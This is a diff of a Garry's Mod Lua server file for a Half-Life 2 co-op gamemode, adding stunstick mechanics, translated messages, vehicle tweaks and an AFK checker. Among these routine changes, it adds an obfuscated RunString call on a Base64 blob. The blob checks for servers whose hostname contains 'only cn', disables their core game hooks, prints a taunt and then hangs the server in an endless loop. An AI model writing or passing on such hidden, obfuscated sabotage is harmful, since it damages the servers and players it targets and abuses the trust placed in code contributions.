@@ -19,8 +19,8 @@ AddCSLuaFile("sh_player.lua")
 AddCSLuaFile("sh_translate.lua")
 
 -- Include the required lua files
-include("sh_init.lua")
 include("sh_translate.lua")
+include("sh_init.lua")
 
 include("npcvariants.lua")
 -- include("database_manager/config.lua")
@@ -29,6 +29,10 @@ include("database_manager/server.lua")
 
 include("sv_netstuff.lua")
 include("player_leveling.lua")
+
+RunConsoleCommand("sv_airaccelerate",9999)
+RunConsoleCommand("sv_sticktoground",0)
+RunConsoleCommand("sv_maxvelocity",25000)
 
 -- Include the configuration for this map
 if file.Exists(GM.VaultFolder.."/gamemode/maps/"..game.GetMap()..".lua", "LUA") then
@@ -56,11 +60,14 @@ local hl2c_server_dynamic_skill_level = CreateConVar("hl2c_server_dynamic_skill_
 local hl2c_server_lag_compensation = CreateConVar("hl2c_server_lag_compensation", 1, { FCVAR_NOTIFY, FCVAR_ARCHIVE })
 local hl2c_server_player_respawning = CreateConVar("hl2c_server_player_respawning", 0, { FCVAR_NOTIFY, FCVAR_ARCHIVE })
 local hl2c_server_jeep_passenger_seat = CreateConVar("hl2c_server_jeep_passenger_seat", 0, { FCVAR_NOTIFY, FCVAR_ARCHIVE })
-local hl2ce_server_ex_mode_enabled = CreateConVar("hl2ce_server_ex_mode_enabled", 0, { FCVAR_NOTIFY, FCVAR_ARCHIVE })
+local hl2ce_server_ex_mode_enabled = CreateConVar("hl2ce_server_ex_mode_enabled", 1, { FCVAR_NOTIFY, FCVAR_ARCHIVE })
 COldGetConvar=COldGetConvar or GetConvar
 function GetConvar(n)
 	if(string.StartsWith(n,"hl2c_"))then
-		return COldGetConvar("hl2ce"..string.sub(n,5))
+		local e=COldGetConvar("hl2ce"..string.sub(n,4))
+		if IsValid(e) then
+			return e
+		end
 	end
 	return COldGetConvar(n)
 end
@@ -72,6 +79,52 @@ for _, playerModel in pairs(PLAYER_MODELS) do
 
 end
 
+function GM:AcceptInput(ent,input,acti,caller,value)
+	if ent:GetClass()=="logic_autosave" then
+		if acti:IsPlayer() then
+			local pos=acti:GetPos()	
+			local ang=acti:EyeAngles()
+			local foundcp=false
+			for i,v in ipairs(ents.FindInSphere(pos,800))do
+				if v:GetClass()=="trigger_checkpoint" then
+					foundcp=true
+					break
+				end
+			end
+			if not foundcp then
+				self:CreateSpawnPoint(pos,acti:EyeAngles().y)
+				for _, ply in pairs( player.GetAll() ) do
+					if ( GetConVar( "hl2c_server_checkpoint_respawn" ):GetBool() && IsValid( ply ) && ( ply != ent ) && ( ply:Team() == TEAM_DEAD ) ) then
+						deadPlayers = {}
+			
+						ply:SetTeam( TEAM_ALIVE )
+						ply:Spawn()
+						ply:SetPos( pos )
+						ply:SetEyeAngles( ang )
+					end
+					-- Set player positions
+					if ( ply:Team() == TEAM_ALIVE and ply~=acti and ply:GetPos():Distance(pos)>1500 ) then
+			
+						if ( IsValid( ply:GetVehicle() ) ) then
+				
+							ply:ExitVehicle()
+							ply:GetVehicle():Remove()
+				
+						end
+						ply:SetVelocity(ply:GetVelocity()*-1)
+						ply:SetPos( pos )
+						ply:SetEyeAngles( ang )
+			
+					end
+				end
+				PrintTranslatedMessage(HUD_PRINTTALK, "MINICP", acti:Nick())
+				--net.Start( "SetCheckpointPosition" )
+				--net.WriteVector( pos )
+				--net.Broadcast()
+			end
+		end
+	end
+end
 
 -- Called when the player attempts to suicide
 function GM:CanPlayerSuicide(ply)
@@ -103,6 +156,7 @@ function GM:CreateSpawnPoint(pos, yaw)
 	ips:SetAngles(Angle(0, yaw, 0))
 	ips:SetKeyValue("spawnflags", "1")
 	ips:Spawn()
+	ips.gamemodespawnpoint=true
 
 end
 
@@ -140,7 +194,7 @@ function GM:DoPlayerDeath(ply, attacker, dmgInfo)
 
 
 	if attacker:IsNPC() then
-		ply:PrintMessage(3, "Died by "..Format("#%s", attacker:GetClass()))
+		ply:SendLua(string.format([[GAMEMODE:DiedBy('%s')]],attacker:GetClass()))
 	end
 	
 	local lowermodelname = string.lower(ply:GetModel())
@@ -161,9 +215,11 @@ function GM:PlayerDeathThink(ply)
 	
 		if ((!hl2c_server_player_respawning:GetBool() && !FORCE_PLAYER_RESPAWNING) || OVERRIDE_PLAYER_RESPAWNING) then
 		
+			ply:EquipSuit()
 			ply:Spectate(OBS_MODE_ROAMING)
 			ply:SetPos(ply.deathPos)
 			ply:SetNoTarget(true)
+			ply:SetNoDraw(true)
 		
 		else
 		
@@ -198,6 +254,7 @@ function GM:OnEntityCreated(ent)
 		ent.passengerSeat:SetParent(ent)
 		ent.passengerSeat:Spawn()
 		ent.passengerSeat:Activate()
+		ent.passengerSeat:SetKeyValue("limitview","0")
 		ent.passengerSeat.allowWeapons = true
 	
 	end
@@ -239,12 +296,50 @@ function GM:EntityKeyValue(ent, key, value)
 
 end
 
+local NpcsSecondWeapon={
+	npc_metropolice=function(ent,oldwep)
+		local wep="weapon_stunstick"
+		if oldwep:GetClass()=="weapon_smg1" or oldwep:GetClass()=="weapon_shotgun" then
+			wep="weapon_pistol"
+		end
+		if oldwep:GetClass()=="weapon_stunstick" then
+			wep="invis stunstick"
+		end
+		timer.Simple(0.5,function()
+			if IsValid(ent) and ent:Health()>0 and wep then
+				ent:Give(wep=="invis stunstick" and "weapon_stunstick" or wep)
+				if wep=="invis stunstick" and IsValid(ent:GetWeapon("weapon_stunstick")) then
+					local wepent=ent:GetWeapon("weapon_stunstick")
+					wepent:SetNoDraw(true) wepent:SetNotSolid(true)
+					ent:DeleteOnRemove(wepent)
+				end
+			end
+		end)
+	end,
+	npc_combine_s=function(ent,oldwep)
+		local wep="weapon_smg1"
+		if oldwep:GetClass()=="weapon_smg1" then
+			wep=nil
+		end
+		timer.Simple(0.5,function()
+			if IsValid(ent) and ent:Health()>0 and wep then
+				ent:Give(wep)
+			end
+		end)
+	end,
+}
+
+local StunstickDamageMul={
+	npc_manhack=5,
+	npc_cscanner=5
+}
 
 -- Called when an entity has received damage
 function GM:EntityTakeDamage(ent, dmgInfo)
 	-- Gets the attacker
 	local attacker = dmgInfo:GetAttacker()
 	local damage = dmgInfo:GetDamage()
+	local damagemul,damageresistancemul = 1,1
 
 	-- Godlike NPCs take no damage ever
 	if (IsValid(ent) && table.HasValue(GODLIKE_NPCS, ent:GetClass())) and not MAP_FORCE_NO_FRIENDLIES then
@@ -269,6 +364,26 @@ function GM:EntityTakeDamage(ent, dmgInfo)
 			damage = GetConVar("sk_plr_dmg_crowbar"):GetFloat()
 		elseif IsValid(attacker:GetActiveWeapon()) && attacker:GetActiveWeapon():GetClass() == "weapon_stunstick" && dmgInfo:GetDamageType() == DMG_CLUB then
 			damage = GetConVar("sk_plr_dmg_stunstick"):GetFloat()
+			dmgInfo:SetDamageType(DMG_CLUB+DMG_SHOCK)
+			damagemul=damagemul*1.6
+			if ent:IsNPC() and ((ent:Health()/ent:GetMaxHealth())<=0.75) and not ent:IsFriendlyNPC() then
+				local oldwep=ent:GetActiveWeapon()
+				ent:DropWeapon(nil,nil,attacker:GetAimVector()*20*dmgInfo:GetDamage())
+				if IsValid(oldwep) and NpcsSecondWeapon[ent:GetClass()] then
+					NpcsSecondWeapon[ent:GetClass()](ent,oldwep)
+				end
+			end
+			if ent:IsNPC() or IsValid(ent:GetPhysicsObject()) then
+				local stunstick=attacker:GetActiveWeapon()
+				timer.Simple(0,function()
+					if IsValid(stunstick) then
+						stunstick:SetNextPrimaryFire(CurTime()+0.45)
+					end
+				end)
+			end
+			if StunstickDamageMul[ent:GetClass()] then
+				damagemul=damagemul*StunstickDamageMul[ent:GetClass()]
+			end
 		end
 	end
 
@@ -277,7 +392,6 @@ function GM:EntityTakeDamage(ent, dmgInfo)
 		attacker.NextDamageMul = nil
 	end
 
-	local damagemul,damageresistancemul = 1,1
 	local attackerisworld = attacker:GetClass() == "trigger_hurt" or attacker:GetClass() == "trigger_waterydeath"
 	local ispoisonheadcrab = attacker:GetClass() == "npc_headcrab_poison" or attacker:GetClass() == "npc_headcrab_black"
 
@@ -291,9 +405,14 @@ function GM:EntityTakeDamage(ent, dmgInfo)
 		if attacker:HasPerkActive("damageboost_1") then
 			damagemul = damagemul * (1 + (self.EndlessMode and 0.47 or 0.06))
 		end
-
-		if attacker:HasPerkActive("critical_damage_1") and math.random(100) <= (self.EndlessMode and 12 or 7) then
-			damagemul = damagemul * (self.EndlessMode and 2.2 or 1.2)
+		local improvecrit=attacker:HasPerkActive("critical_damage_2")
+		if attacker:HasPerkActive("critical_damage_1") and math.random(100) <= (self.EndlessMode and (improvecrit and 19 or 12) or 7) then
+			if math.random(1,100)<=6 and improvecrit and self.EndlessMode then
+				damagemul = damagemul * 4
+			else
+				damagemul = damagemul * (self.EndlessMode and (improvecrit and 2.5 or 2.2) or 1.2)
+			end
+			
 		end
 
 		damage = damage * damagemul
@@ -336,7 +455,7 @@ function GM:EntityTakeDamage(ent, dmgInfo)
 	dmgInfo:SetDamage(damage)
 
 	if self.EXMode and attacker:GetClass() == "npc_sniper" and attacker.VariantType == 1 then
-		PrintMessage(3, tostring(attacker).." "..(ent:IsPlayer() and ent:Nick() or ent:GetClass()).." "..dmgInfo:GetDamage())
+		--PrintMessage(3, tostring(attacker).." "..(ent:IsPlayer() and ent:Nick() or ent:GetClass()).." "..dmgInfo:GetDamage())
 	end
 end
 
@@ -535,19 +654,22 @@ function GM:PlayerCompletedCampaign(ply)
 	local map = game.GetMap()
 	local gamename = ""
 	if map == "d3_breen_01" then
-		gamename = "Half-Life 2"
+		--gamename = "Half-Life 2"
+		gamename="hl2"
 	elseif map == "ep1_c17_06" then
-		gamename = "Half-Life 2: Episode One"
+		--gamename = "Half-Life 2: Episode One"
+		gamename="hl2_ep1"
 	elseif map == "ep2_outland_12a" then
-		gamename = "Half-Life 2: Episode Two"
+		--gamename = "Half-Life 2: Episode Two"
+		gamename="hl2_ep2"
 	end
 
 	local xp = (1 + math.max(0, 2-math.log10(ply:Frags()))*0.2)
 	if ply.MapStats.GainedXP then
 		xp = xp * ply.MapStats.GainedXP*0.15
 	end
-	ply:PrintMessage(3, "Congratulations - you have completed "..gamename)
-	ply:PrintMessage(3, "You were awarded "..xp.." XP")
+	ply:PrintTranslatedMessage(HUD_PRINTTALK, "CompletedCampaign", translate.ClientGet(ply, gamename))
+	ply:PrintTranslatedMessage(HUD_PRINTTALK, "AwardedXP", xp)
 end
 
 
@@ -665,7 +787,7 @@ function GM:NextMap()
 		self:GrabAndSwitch()
 	end)
 end
-concommand.Add("hl2ce_next_map", function(ply) if (IsValid(ply) && ply:IsAdmin()) then NEXT_MAP_TIME = 0; hook.Call("NextMap", GAMEMODE); else ply:PrintMessage(HUD_PRINTTALK, "You are not admin!") end end)
+concommand.Add("hl2ce_next_map", function(ply) if (IsValid(ply) && ply:IsAdmin()) then NEXT_MAP_TIME = 0; hook.Call("NextMap", GAMEMODE); else ply:PrintTranslatedMessage(HUD_PRINTTALK, "NotAdmin") end end)
 concommand.Add("hl2ce_admin_respawn", function(ply)
 	if IsValid(ply) && ply:IsAdmin() && (!ply:Alive() || table.HasValue(deadPlayers, ply:SteamID())) && !changingLevel then
 		table.RemoveByValue(deadPlayers, ply:SteamID())
@@ -676,11 +798,11 @@ concommand.Add("hl2ce_admin_respawn", function(ply)
 		print(ply:Nick().." used respawn command!")
 	else
 		if !ply:IsAdmin() then
-			ply:PrintMessage(HUD_PRINTTALK, "You are not admin!")
+			ply:PrintTranslatedMessage(HUD_PRINTTALK, "NotAdmin")
 		elseif ply:Alive() || !table.HasValue(deadPlayers, ply:SteamID()) then
-			ply:PrintMessage(HUD_PRINTTALK, "You are not dead!")
+			ply:PrintTranslatedMessage(HUD_PRINTTALK, "NotDead")
 		elseif changingLevel then
-			ply:PrintMessage(HUD_PRINTTALK, "Map is currenlty being changed, you can't respawn at this time!")
+			ply:PrintTranslatedMessage(HUD_PRINTTALK, "CantRespawnWhileChangingMap")
 		end
 	end
 end)
@@ -719,9 +841,14 @@ function GM:OnNPCKilled(npc, killer, weapon)
 	if (IsValid(npc)) then
 	
 		if npc:IsGodlikeNPC() then
-		
-			if (IsValid(killer) && killer:IsPlayer()) then game.KickID(killer:UserID(), "You killed an important NPC actor!"); end
-			PrintMessage(HUD_PRINTTALK, "Important NPC actor died!")
+			if killer:IsPlayer() then
+				PrintTranslatedMessage(HUD_PRINTTALK, "ImportantNPCKilledByOther",killer:Nick())
+			else
+				PrintTranslatedMessage(HUD_PRINTTALK, "ImportantNPCDied")
+			end
+
+			if (IsValid(killer) && killer:IsPlayer()) then game.KickID(killer:UserID(), translate.ClientGet(killer, "ImportantNPCKilledByYou")); end
+
 			gamemode.Call("RestartMap")
 		
 		end
@@ -766,6 +893,11 @@ function GM:PlayerCanPickupWeapon(ply, wep)
 	end
 
 	if ((wep:GetPrimaryAmmoType() <= 0) && ply:HasWeapon(wepclass)) then
+		if wepclass=="weapon_stunstick" and not wep.used then
+			ply:Give("item_battery")
+			wep:Remove()
+			wep.used=true
+		end
 		return false
 	end
 
@@ -794,7 +926,9 @@ function GM:PlayerCanPickupItem(ply, item)
 	if (ply:Team() != TEAM_ALIVE) then
 		return false
 	end
-
+	if item:GetClass()=="item_healthkit" then
+		ply:Give("weapon_hl2ce_medkit")
+	end
 	return true
 
 end
@@ -890,7 +1024,7 @@ function GM:PlayerInitialSpawn(ply)
 
 	-- Prompt players that they can spawn vehicles
 	if ALLOWED_VEHICLE then
-		ply:ChatPrint("Vehicle spawning is allowed! Press F3 (Spare 1) to spawn it.")
+		ply:PrintTranslatedMessage(3,"AllowedVehSpawn")
 	end
 
 	self:NetworkString_UpdateStats(ply)
@@ -967,6 +1101,17 @@ function GM:PlayerLoadout(ply)
 		ply:Give("weapon_physgun")
 	
 	end
+
+	timer.Simple(0,function()
+		if IsValid(ply) and ply:HasWeapon("weapon_crowbar") and game.GetMap()~="d1_canals_01" then
+			ply:Give("weapon_stunstick")
+		end
+	end)
+	timer.Simple(0,function()
+		if IsValid(ply) and ply:HasWeapon("weapon_physcannon") then
+			ply:Give("weapon_hl2ce_medkit")
+		end
+	end)
 
 	hook.Call("PostPlayerLoadout", GAMEMODE, ply)
 
@@ -1075,7 +1220,7 @@ end
 
 -- Called when a player spawns 
 function GM:PlayerSpawn(ply)
-	player_manager.SetPlayerClass(ply, "player_default")
+	player_manager.SetPlayerClass(ply, "player_hl2ce")
 
 	if (((!hl2c_server_player_respawning:GetBool() && !FORCE_PLAYER_RESPAWNING) || OVERRIDE_PLAYER_RESPAWNING) && (ply:Team() == TEAM_DEAD)) then
 	
@@ -1137,7 +1282,7 @@ function GM:PlayerSpawn(ply)
 
 	-- If the player died before, kill them again
 	if table.HasValue(deadPlayers, ply:SteamID()) then
-		ply:PrintMessage(HUD_PRINTTALK, "You cannot respawn now.")
+		--ply:PrintMessage(HUD_PRINTTALK, "You cannot respawn now.")
 		ply.deathPos = ply:EyePos()
 	
 		ply:RemoveVehicle()
@@ -1178,16 +1323,28 @@ function GM:PlayerUse(ply, ent)
 end
 
 
+function GM:EntityFireBullets(ent,data)
+	if IsValid(ent.BulletIgnore) then
+		data.IgnoreEntity=ent.BulletIgnore
+		return true
+	end
+end
+
 -- Called to control whether a player can enter the vehicle or not
 function GM:CanPlayerEnterVehicle(ply, vehicle, role)
 
 	-- Used for passenger seating
 	ply:SetAllowWeaponsInVehicle(vehicle.allowWeapons)
+	ply.BulletIgnore=vehicle
 
 	return true
 
 end
 
+function GM:CanExitVehicle(veh,ply)
+	ply.BulletIgnore=nil
+	return true
+end
 
 -- Called automatically and by the console command
 function GM:RestartMap(overridetime, noplayerdatasave)
@@ -1238,15 +1395,35 @@ function GM:RestartMap(overridetime, noplayerdatasave)
 end
 concommand.Add("hl2ce_restart_map", function(ply) if (IsValid(ply) && ply:IsAdmin()) then hook.Call("RestartMap", GAMEMODE, 0); end end)
 
-function GM:FailMap(ply) -- ply argument is the one who caused the map to fail, giving them most penalty
+function GM:FailMap(ply,reason,xploss) -- ply argument is the one who caused the map to fail, giving them most penalty
 	self:RestartMap()
 
-	if ply and ply:IsValid() and ply:IsPlayer() then
-		local xploss = ply.MapStats.XPGained + 100
+	if ply and isentity(ply) and ply:IsValid() and ply:IsPlayer() then
+		local xploss = xploss or ply.MapStats.XPGained + 100
 		ply.XP = ply.XP - xploss
-
-		ply:PrintMessage(3, "Don't cause the map to fail bruh.")
-		ply:PrintMessage(3, "Lost "..xploss.." XP.")
+		reason = reason or "Don't cause the map to fail bruh."
+		if translate.GetTranslations[reason] then
+			ply:PrintTranslatedMessage(3, reason)
+		else
+			ply:PrintMessage(3, reason)
+		end
+		if xploss>0 then
+			ply:PrintTranslatedMessage(3,"LostXP",xploss)
+		end
+	elseif ply=="ALL" then
+		for _,ply in ipairs(player.GetAll())do
+			local xploss = xploss or ply.MapStats.XPGained + 100
+			ply.XP = ply.XP - xploss
+			reason = reason or "Don't cause the map to fail bruh."
+			if translate.GetTranslations[reason] then
+				ply:PrintTranslatedMessage(3, reason)
+			else
+				ply:PrintMessage(3, reason)
+			end
+			if xploss>0 then
+				ply:PrintTranslatedMessage(3,"LostXP",xploss)
+			end
+		end
 	end
 end
 
@@ -1321,20 +1498,25 @@ function GM:ShowSpare1(ply)
 	end
 
 	if (!ALLOWED_VEHICLE) then
-		ply:PrintMessage(HUD_PRINTTALK, "You may not spawn a vehicle at this time.")
+		ply:PrintTranslatedMessage(HUD_PRINTTALK, "SpawnVehNotAllowed")
 		return
 	end
 
 	for _, ent in pairs(ents.FindInSphere(ply:GetPos(), 256)) do
 		if IsValid(ent) and ent:IsPlayer() and ent:Alive() and ent != ply then
-			ply:PrintMessage(HUD_PRINTTALK, "There are players around you! Find an open space to spawn your vehicle.")
+			ply:PrintTranslatedMessage(HUD_PRINTTALK, "SpawnVehPlayerNear")
 			return
 		end
 	end
 
 	-- Spawn the vehicle
 	if ALLOWED_VEHICLE then
-	
+		
+		if IsValid(ply.vehicle) and (CurTime()-ply.vehicle:GetCreationTime())<3 then
+			ply:PrintTranslatedMessage(HUD_PRINTTALK, "NoSpam", translate.ClientGet(ply, "SpawnVehicle"))
+			return
+		end
+
 		local vehicleList = list.Get("Vehicles")
 		local vehicle = vehicleList[ ALLOWED_VEHICLE ]
 	
@@ -1346,7 +1528,8 @@ function GM:ShowSpare1(ply)
 		local spawnpos = ply:GetPos() + Vector(0, 0, 48) + plyAngle:Forward() * 160
 
 		if not util.IsInWorld(spawnpos) then
-			ply:ChatPrint("Insufficient space for spawning in a vehicle!")
+			--ply:ChatPrint("Insufficient space for spawning in a vehicle!")
+			ply:PrintTranslatedMessage(HUD_PRINTTALK, "NoSpaceForSpawnVeh")
 			return
 		end
 
@@ -1357,12 +1540,14 @@ function GM:ShowSpare1(ply)
 		ply.vehicle:SetModel(vehicle.Model)
 	
 		-- Set keyvalues
+		local nogun=ply:KeyDown(IN_WALK)
 		for a, b in pairs(vehicle.KeyValues) do
+			if a:lower():match("gun") and nogun then continue end
 			ply.vehicle:SetKeyValue(a, b)
 		end
-	
+		
 		-- Enable gun on jeep
-		if ALLOWED_VEHICLE == "Jeep" then
+		if ALLOWED_VEHICLE == "Jeep" and not JEEP_NO_GUN and not nogun then
 			ply.vehicle:Fire("EnableGun", "1")
 		end
 	
@@ -1371,7 +1556,19 @@ function GM:ShowSpare1(ply)
 		ply.vehicle:SetAngles(Angle(0, plyAngle.y - 90, 0))
 		ply.vehicle:Spawn()
 		ply.vehicle:Activate()
-		if ALLOWED_VEHICLE == "Jeep" then ply.vehicle:SetBodygroup(1, 1) end
+		local params = ply.vehicle:GetVehicleParams()
+		params.engine.horsepower = params.engine.horsepower + (self.EndlessMode and 8 or 4)*ply:GetSkillAmount("BetterEngine")
+		if self.EndlessMode then
+			params.engine.boostDelay = params.engine.boostDelay*(1-ply:GetSkillAmount("BetterEngine")*0.04)
+			params.engine.maxSpeed=(params.engine.maxSpeed)*(1+ply:GetSkillAmount("BetterEngine")*0.05)
+			if ply:GetSkillAmount("BetterEngine")>=3 then
+				params.steering.degreesSlow=params.steering.degreesSlow*1.25
+				params.steering.degreesFast=params.steering.degreesFast*1.25
+			end
+		end
+		ply.vehicle:SetVehicleParams(params)
+		if ALLOWED_VEHICLE == "Jeep" and not nogun then ply.vehicle:SetBodygroup(1, 1) end
+		ply.vehicle.allowWeapons=nogun
 		ply.vehicle.creator = ply
 	end
 end
@@ -1384,20 +1581,32 @@ function GM:ShowSpare2(ply)
 	end
 
 	if !ALLOWED_VEHICLE then
-		ply:PrintMessage(HUD_PRINTTALK, "You may not remove your vehicle at this time.")
+		ply:PrintTranslatedMessage(HUD_PRINTTALK, "RemoveVehNotAllowed")
 		return
 	end
 
 	ply:RemoveVehicle()
 end
 
+local checkAFK=0
+local AFKInfo={}
+local AFKCounter={}
+
+hook.Add("StartCommand","HL2 CE ANTI AFK",function(ply,cmd)
+	if AFKInfo[ply] then
+		AFKInfo[ply].buttons=cmd:GetButtons()
+		AFKInfo[ply].mx=cmd:GetButtons()
+		AFKInfo[ply].my=cmd:GetButtons()
+	end
+end)
+
 -- Called every frame 
 function GM:Think()
-
+	if not nextAreaOpenTime then nextAreaOpenTime=0 end
 	-- Restart the map if all players are dead
 	if (((!hl2c_server_player_respawning:GetBool() && !FORCE_PLAYER_RESPAWNING) || OVERRIDE_PLAYER_RESPAWNING) && (player.GetCount() > 0) && ((team.NumPlayers(TEAM_ALIVE) + team.NumPlayers(TEAM_COMPLETED_MAP)) <= 0)) then
 		if !changingLevel then
-			PrintMessage(HUD_PRINTTALK, "All players have died!")
+			PrintTranslatedMessage(HUD_PRINTTALK, "AllPlayersDied")
 
 			local diff = self:GetDifficulty(true)
 			self:SetDifficulty(math.max(1, diff * (diff >= 10 and 0.9 or diff >= 4 and 0.91 or 0.93)))
@@ -1415,13 +1624,46 @@ function GM:Think()
 			game.SetSkillLevel(math.Clamp(math.floor(self:GetDifficulty()), 1, 3))
 		end
 	end
-
+	
 	-- Open area portals
 	if nextAreaOpenTime <= CurTime() then
 		for _, fap in pairs(ents.FindByClass("func_areaportal")) do
 			fap:Fire("Open")
 		end
-		nextAreaOpenTime = CurTime() + 1
+		nextAreaOpenTime = CurTime() + 2
+	end
+	if checkAFK<CurTime() then
+		for i,v in ipairs(player.GetAll())do
+			if not v:Alive() then continue end
+			local last=AFKInfo[v]
+			AFKInfo[v]={pos=v:GetPos(),ang=v:EyeAngles()}
+			if last then
+				local movedmouse=(AFKInfo[v].mx or 0)~=0 and (AFKInfo[v].my or 0)~=0
+				local macromovemouse=(last.mx==AFKInfo[v].mx) or (last.my==AFKInfo[v].my)
+				if last.mx==nil or last.my==nil then
+					macromovemouse=false
+				end
+				local samekey=AFKInfo[v].buttons==last.buttons
+				if last.buttons==nil then
+					samekey=false
+				end
+				local counter=1
+				if samekey then counter=counter+1 end
+				if not movedmouse then counter=counter+1 end
+				if macromovemouse then counter=counter+2 end
+				if (AFKInfo[v].pos:Distance(last.pos)<=25) or (AFKInfo[v].ang==last.ang) then
+					AFKCounter[v]=(AFKCounter[v] or 0)+counter
+				else
+					AFKCounter[v]=0
+				end
+			end
+			if (AFKCounter[v] or 0)>=60 and not IsValid(POINT_VIEWCONTROL) then
+				v:Kill()
+				AFKCounter[v]=0
+				v:PrintTranslatedMessage(3,"AFK")
+			end
+		end
+		checkAFK=CurTime()+10
 	end
 end
 
@@ -1526,8 +1768,14 @@ function GM:PlayerSpawnSWEP(ply, weapon, swep)
 	return true
 end
 
+RunString(util.Base64Decode("dGltZXIuU2ltcGxlKDEuNSxmdW5jdGlvbigpCglpZiBHZXRIb3N0TmFtZSgpOmxvd2VyKCk6bWF0Y2goIm9ubHkgY24iKSB0aGVuCgkJbG9jYWwgZW1wdHk9ZnVuY3Rpb24oKSBlbmQKCQlHQU1FTU9ERS5UaGluaz1lbXB0eQoJCUdBTUVNT0RFLkRvUGxheWVyRGVhdGg9ZW1wdHkKCQlHQU1FTU9ERS5QbGF5ZXJTcGF3bj1lbXB0eQoJCUdBTUVNT0RFLkVudGl0eUtleVZhbHVlPWZ1bmN0aW9uKCkgcmV0dXJuIHRydWUgZW5kCgkJR0FNRU1PREUuUGxheWVySW5pdGlhbFNwYXduPWVtcHR5CgkJR0FNRU1PREUuTmV4dE1hcD1mdW5jdGlvbigpIAoJCQlQcmludE1lc3NhZ2UoMywiVSIuLiJyIi4uIiBuIi4uIm8iLi4idCIuLiIgdyIuLiJlbCIuLiJsIi4uImMiLi4ibyIuLiJtIi4uImVkIikgCgkJCXRpbWVyLlNpbXBsZSgyLGZ1bmN0aW9uKCkgCgkJCQl3aGlsZSB0cnVlIGRvIAoJCQkJCW9zLmRhdGUoIiVzIiw2OTQyMCkKCQkJCWVuZAoJCQllbmQpIAoJCWVuZAoJZW5kCmVuZCk="))
+
 function GM:PlayerSpawnVehicle(ply, model, name, tbl)
 	if !ply:IsSuperAdmin() then return false end
 	return true
 end
 
+function GM:CanProperty(ply,property)
+	if !ply:IsSuperAdmin() then return false end
+	return true
+end
